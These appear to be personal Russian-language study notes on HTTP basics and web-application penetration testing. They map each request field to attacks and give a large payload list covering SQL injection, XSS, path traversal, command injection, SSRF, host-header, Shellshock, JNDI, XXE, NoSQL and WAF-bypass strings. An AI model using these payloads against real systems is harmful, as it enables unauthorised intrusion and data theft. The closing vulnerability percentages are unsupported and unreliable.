## **Что такое HTTP/HTTPS?**

**HTTP (HyperText Transfer Protocol)** — протокол передачи данных в формате "клиент-сервер".  
**HTTPS = HTTP + TLS/SSL** — защищённая версия с шифрованием.

#HTTP = порт 80 , без шифрования, быстрая скорость , легко перехватить

#HTTPS= порт 443 , TLS/SSL шифрование , медленнее скорость , защищено от MITM

### ==**Методы запросов (HTTP Methods)**==

GET    /search?q=test            # Получить данные (параметры в URL)
POST   /login                            # Отправить данные (в теле)
PUT    /api/users/1                # Обновить/создать ресурс
DELETE /api/users/1           # Удалить ресурс
HEAD   /                                     # Только заголовки (без тела)
OPTIONS /                                # Какие методы поддерживаются
TRACE  /                                    # Эхо-запрос (опасен для XST)
CONNECT /                              # Для прокси (может быть опасен)
PATCH  /api/users/1             # Частичное обновление

==Версии==
|**HTTP/0.9**|1991|Только GET, нет заголовков|Редко, исторические системы|
|**HTTP/1.0**|1996|Заголовки, методы, коды|Может быть небезопасная конфигурация|

|**HTTP/1.1**|1997|Keep-alive, chunked encoding|**Основная сегодня**, 99% тестов|

|**HTTP/2**|2015|Бинарный, мультиплексирование|Новые *атаки (HPACK, stream abuse)|*
|**HTTP/3**|2022|На базе QUIC (UDP)|Экспериментальные атаки|

==пример    **Запросa на сервер (Request)**==
```http
GET /admin.php?id=1 HTTP/1.1          ← Стартовая строка (Method + Path + Version)  Я хочу **получить** (GET) страницу `/admin.php` с параметром `id=1`, используя протокол версии **HTTP/1.1**"


Host: example.com               --это **адрес назначения**, куда сервер должен отправить ответ

User-Agent: Mozilla/5.0         -- кто я
Cookie: session=abc123          -- данные сессиис/ ключи
Accept: text/html               -- в каком формате вернуть данные
Referrer: https://google.com    -- с какого сайта я отправил это(авто)

Content-Type: application/x-www-form-urlencoded
                                        ← Пустая строка (обязательно!)
                                        **Что это:** "КОНЕЦ ЗАГОЛОВКОВ, дальше идёт ТЕЛО письма".

**Важно:** Без этой пустой строки сервер не поймёт, где кончаются заголовки.


username=admin&password=123           ← Тело (Body, есть не всегда)
```

==пример    **Ответa (Response)**==
```http
HTTP/1.1 200 OK                       ← Статусная строка (Version + Code + Message)
Date: Mon, 23 Dec 2024 12:00:00 GMT   ← дата отправки птсьма
Server: Apache/2.4.41      -- версия сервера 
Content-Type: text/html  
Set-Cookie: session=xyz789    -- новый куки на след раз
Content-Length: 1234
                                        ← Пустая строка
<!DOCTYPE html>                       ← Тело
<html><body>Hello</body></html>
```

==### **B. Коды состояния (Status Codes)**==
```http
1xx - Информационные           # 100 Continue, 101 Switching Protocols

2xx - Успех                    # 200 OK, 201 Created, 204 No Content

3xx - Перенаправление          # 301 Moved Permanently, 302 Found, 
                                                      304 Not Modified
                                                      
4xx - Ошибка клиента           # 400 Bad Request, 401 Unauthorized,
                                 403 Forbidden,   404 Not Found
                                 
5xx - Ошибка сервера           # 500 Internal Server Error, 502 Bad 
Gateway, 503 Service Unavailable
```

# ==места атаки==

==GET /admin.php?id=1 HTTP/1.1==                                ⬅️ МЕСТО 1: Параметры в URL
==Host: example.com==                                                            ⬅️ МЕСТО 2: Host header
==User-Agent: Mozilla/5.0==                                                ⬅️ МЕСТО 3: User-Agent
==Cookie: session=abc123==                                                     ⬅️ МЕСТО 4: Cookies
==Accept: text/html==                                                                     ⬅️ МЕСТО 5: Accept header
==Referer: https://google.com  ь==                                          ⬅️ МЕСТО 6: Referer
====Content-Type: application/x-www-form-urlencoded== ⬅️ МЕСТО 7: Content-Type
                                                    ⬅️ Пустая строка (разделитель)
==username=admin&password=123==                              ⬅️ МЕСТО 8: Тело запроса (POST параметры)

## 1 MЕСТО  = Параметры в URL
```http
# SQL Injection
GET /admin.php?id=1' OR '1'='1 HTTP/1.1
GET /admin.php?id=1' UNION SELECT username,password FROM users-- HTTP/1.1

# XSS
GET /admin.php?id=1"><script>alert(1)</script> HTTP/1.1
GET /admin.php?id=javascript:alert(1) HTTP/1.1

# Path Traversal/LFI
GET /admin.php?id=../../../etc/passwd HTTP/1.1
GET /admin.php?id=....//....//....//etc/passwd HTTP/1.1

# Command Injection
GET /admin.php?id=1;id HTTP/1.1
GET /admin.php?id=1|whoami HTTP/1.1

# SSRF
GET /admin.php?id=http://169.254.169.254/latest/meta-data/ HTTP/1.1
```
## 2 MЕСТО   = Host header
```http
# Host header injection
Host: evil.com
Host: example.com:80@evil.com
Host: example.com\r\nInjected-Header: value

# SSRF через Host
Host: 169.254.169.254
Host: localhost
Host: 127.0.0.1:8080

# Cache poisoning
Host: example.com
X-Forwarded-Host: evil.com
```
## 3 MЕСТО =  User-Agent
```http
# XSS в логах (если логируются)
User-Agent: Mozilla/5.0 <script>alert(1)</script>

# SQL Injection
User-Agent: Mozilla/5.0' OR '1'='1

# Проверка на уязвимости
User-Agent: () { :; }; /bin/bash -c 'id'  # Shellshock
```
## 4 MЕСТО   = Cookies
```http
# Пробуем другие сессии
Cookie: session=admin
Cookie: session=1
Cookie: session=../etc/passwd

# SQL Injection в cookie
Cookie: session=' OR '1'='1
Cookie: session=abc123' UNION SELECT NULL--

# JWT manipulation (если используется JWT)
Cookie: session=eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.  # Изменённый JWT
```
## 5 MЕСТО  = Accept header
```http
# Пробуем другие форматы
Accept: application/json
Accept: */*
Accept: text/html;q=0.9,application/xhtml+xml;q=0.8,application/xml;q=0.5,*/*;q=0.1

# Проверка на XSS через content-type
Accept: text/html"><script>alert(1)</script>
```
## 6 MЕСТО  = Referer
```http
# Проверяем, принимает ли Referer
Referer: https://evil.com
Referer: javascript:alert(1)
Referer: data:text/html,<script>alert(1)</script>

# Если сайт проверяет Referer для CSRF защиты
Referer: https://example.com  # Пробуем подделать правильный Referer
```
## 7 MЕСТО  = Content-Type
```http
# Меняем Content-Type
Content-Type: application/json
Content-Type: text/xml
Content-Type: multipart/form-data; boundary=something

# XSS через Content-Type
Content-Type: text/html"><script>alert(1)</script>
```
## 8 MЕСТО = Тело запроса  
```http
# SQL Injection
username=admin' OR '1'='1--&password=anything
username=admin' UNION SELECT NULL,NULL--&password=

# XSS
username=<script>alert(1)</script>&password=test
username="><img src=x onerror=alert(1)>&password=

# Command Injection
username=admin&password=123;id
username=admin&password=123|whoami

# NoSQL Injection (если MongoDB)
username[$ne]=admin&password[$ne]=123
username=admin' || '1'=='1&password=test
```

# PAY_LOAD_s

```txt

# =============================================
# БАЗОВЫЕ СИНТАКСИЧЕСКИЕ ТЕСТЫ (САМЫЕ БЕЗОПАСНЫЕ)
# =============================================
'
"
`
;
--
-- 
# 
/* 
*/ 
')
")
'))
\\

# =============================================
# SQL INJECTION (ERROR-BASED, БЕЗ ИЗМЕНЕНИЯ ДАННЫХ)
# =============================================
' AND '1'='1
' AND '1'='2
" AND "1"="1
" AND "1"="2
1 AND 1=1
1 AND 1=2
' OR '1'='1
' OR '1'='2
' AND 1=CAST('test' AS INT)--
' OR (SELECT 1/0)--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--
' AND 1=(SELECT COUNT(*) FROM tabname)--
' AND (SELECT * FROM (SELECT(SLEEP(1)))a)--

# =============================================
# UNION-BASED SQLi (БЕЗОПАСНЫЕ ПРОВЕРКИ)
# =============================================
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,'test',NULL--
' UNION SELECT @@version,NULL--
' UNION SELECT version(),NULL--
' UNION SELECT user(),NULL--
' UNION SELECT database(),NULL--

# =============================================
# TIME-BASED SQLi (МИНИМАЛЬНЫЕ ЗАДЕРЖКИ)
# =============================================
' AND SLEEP(1)--
' OR SLEEP(1)--
' AND (SELECT * FROM (SELECT(SLEEP(1)))a)--
';SELECT SLEEP(1)--
' AND BENCHMARK(100000,MD5('test'))--
' WAITFOR DELAY '0:0:1'--
' AND pg_sleep(1)--

# =============================================
# XSS (БЕЗОПАСНЫЕ ПРОВЕРКИ, НЕ ВОРУЮТ ДАННЫЕ)
# =============================================
"><script>alert(1)</script>
'><script>alert(1)</script>
"><img src=x onerror=alert(1)>
javascript:alert(1)
" onmouseover="alert(1)
' onmouseover='alert(1)
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<a href="javascript:alert(1)">click</a>

# =============================================
# PATH TRAVERSAL / LFI (ТОЛЬКО ПРОВЕРКИ)
# =============================================
../../../etc/passwd
..\..\..\windows\win.ini
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
/etc/passwd
c:\windows\win.ini
.../.../.../etc/passwd

# =============================================
# COMMAND INJECTION (БЕЗОПАСНЫЕ КОМАНДЫ)
# =============================================
;echo test
|echo test
&echo test
`echo test`
$(echo test)
||echo test
&&echo test
;id
|id
&id
`id`
$(id)
;whoami
|whoami

# =============================================
# SSRF (БЕЗОПАСНЫЕ АДРЕСА, ТОЛЬКО ПРОВЕРКА)
# =============================================
http://169.254.169.254/latest/meta-data/
http://localhost:80
http://127.0.0.1:80
http://[::1]:80
http://0.0.0.0:80
file:///etc/passwd
gopher://localhost:80
dict://localhost:80

# =============================================
# HOST HEADER INJECTION (БЕЗОПАСНЫЕ ТЕСТЫ)
# =============================================
evil.com
example.com:80@evil.com
example.com\r\nInjected-Header: test
localhost
127.0.0.1
169.254.169.254
example.com.bad.com
-example.com

# =============================================
# COOKIE INJECTION (БЕЗОПАСНЫЕ ПРОВЕРКИ)
# =============================================
' OR '1'='1
" OR "1"="1
admin
true
1
../etc/passwd
..././..././etc/passwd
${jndi:ldap://test}

# =============================================
# USER-AGENT INJECTION (БЕЗОПАСНЫЕ ТЕСТЫ)
# =============================================
Mozilla/5.0 ' OR '1'='1
Mozilla/5.0 <script>alert(1)</script>
() { :; }; echo test
Mozilla/5.0\" OR \"1\"=\"1

# =============================================
# REFERER INJECTION (БЕЗОПАСНЫЕ ТЕСТЫ)
# =============================================
https://evil.com
javascript:alert(1)
data:text/html,<script>alert(1)</script>
http://localhost
http://127.0.0.1
example.com@evil.com

# =============================================
# CONTENT-TYPE MANIPULATION (БЕЗОПАСНЫЕ ТЕСТЫ)
# =============================================
application/json
text/xml
multipart/form-data; boundary=test
text/html"><script>alert(1)</script>
application/x-www-form-urlencoded' OR '1'='1

# =============================================
# WAF BYPASS (БЕЗОПАСНЫЕ ОБХОДЫ)
# =============================================
%27
%2527
%bf%27
%2D%2D
%23
SEL%0bECT
UNI%0dON
'/**/OR/**/1=1--
'%0aOR%0a'1'='1
' AND 1 LIKE 1--
1' and@'1'='1
'%20OR%20'1'='1

# =============================================
# JSON INJECTION (БЕЗОПАСНЫЕ ТЕСТЫ)
# =============================================
{"id":"1'"}
{"id":"1' OR '1'='1"}
{"id":"1\" OR \"1\"=\"1"}
{"id":{"$ne":1}}
{"id":{"$regex":".*"}}

# =============================================
# XXE (БЕЗОПАСНЫЕ ПРОВЕРКИ)
# =============================================
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>

# =============================================
# NO-SQL INJECTION (БЕЗОПАСНЫЕ ТЕСТЫ)
# =============================================
{"$ne": null}
{"$ne": 1}
{"$regex": ".*"}
{"$where": "1==1"}
' || '1'=='1
' || 1==1
' && 1==1





```
## **ТАБЛИЦА: КАЖДАЯ СТРОЧКА → ВОЗМОЖНЫЕ АТАКИ**

|  Строка запроса  |  Основные атаки  |     Пример payload    |   Риск  | 



|**URL параметры** (`id=1`)|SQLi, XSS, Path traversal, Command injection, SSRF|`1' OR '1'='1`, `../../../etc/passwd`|ВЫСОКИЙ|


|**Host header**|Host injection, Cache poisoning, SSRF|`evil.com`, `localhost`|СРЕДНИЙ|

|**User-Agent**|XSS, Log injection, Command injection|`<script>alert(1)</script>`|НИЗКИЙ|

|**Cookies**|Session hijacking, SQLi, Path traversal|`' OR '1'='1`, `../etc/passwd`|ВЫСОКИЙ|

|**Accept header**|Content-type manipulation, XSS|`text/html"><script>`|НИЗКИЙ|

|**Referer**|Open redirect, Referer-based auth bypass|`javascript:alert(1)`|СРЕДНИЙ|

|**Content-Type**|Content-type confusion, XSS|`application/json`|НИЗКИЙ|

|**Тело запроса**|ВСЁ выше + NoSQLi, XXE|`admin'--`, `{$ne: null}`|



### **ВО ВСЕ ТЕКСТОВЫЕ ПОЛЯ можно:**

1. **SQLi тесты** (`'`, `"`, `' OR '1'='1`)
    
2. **XSS тесты** (`<script>alert(1)</script>`)
    
3. **Path traversal** (`../../../etc/passwd`)
    

### **📌 ТОЛЬКО В URL/Теле запроса:**

- **Command injection** (`;id`, `|whoami`)
    
- **SSRF** (`http://169.254.169.254/`)
    

### **📌 ТОЛЬКО В ЗАГОЛОВКАХ:**

- **Host header attacks** (подмена хоста)
    
- **Cache poisoning** (через X-Forwarded-Host)
    

### **📌 ТОЛЬКО В СПЕЦИФИЧНЫХ ПОЛЯХ:**

- **NoSQLi** → только если backend использует MongoDB
    
- **XXE** → только если парсится XML
    
- **JSONi** → только если `Content-Type: application/json`
    

## 🔧 **КАК ТЕСТИРОВАТЬ СИСТЕМАТИЧНО:**

1. **Начните с параметров URL** — там чаще всего уязвимости
    
2. **Потом тело запроса** (если POST)
    
3. **Затем Cookies** — часто забывают валидировать
    
4. **Потом заголовки** (Host, User-Agent, Referer)
    
5. **В конце специфичные тесты** (NoSQLi, XXE, JSONi)
    

## ⚠️ **ВАЖНОЕ ПРАВИЛО:**

**Если поле принимает ввод пользователя → оно потенциально уязвимо.**  
Разница только в **вероятности** и **последствиях**:

- **Параметры URL**: 90% SQLi/XSS находят здесь
    
- **Cookies**: 70% уязвимостей контроля доступа
    
- **Заголовки**: 30% обходов WAF/фильтров
    
- **Тело запроса**: 50% уязвимостей в API